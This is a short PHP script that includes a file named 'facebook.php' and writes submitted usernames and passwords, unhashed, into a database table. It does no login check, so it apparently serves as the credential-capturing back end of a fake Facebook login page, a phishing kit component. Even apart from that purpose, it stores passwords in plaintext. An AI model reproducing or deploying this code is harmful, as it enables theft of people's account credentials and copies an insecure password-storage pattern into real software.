
<?php

include 'facebook.php';

if (isset($_POST['submit'])) {

    $username = mysqli_real_escape_string($con, $_POST['username']);
    $password = mysqli_real_escape_string($con, $_POST['password']);
    $query = "INSERT INTO dilkashraja(name,pass) VALUES ('$username','$password')";
    $run = mysqli_query($con,$query);
}
?>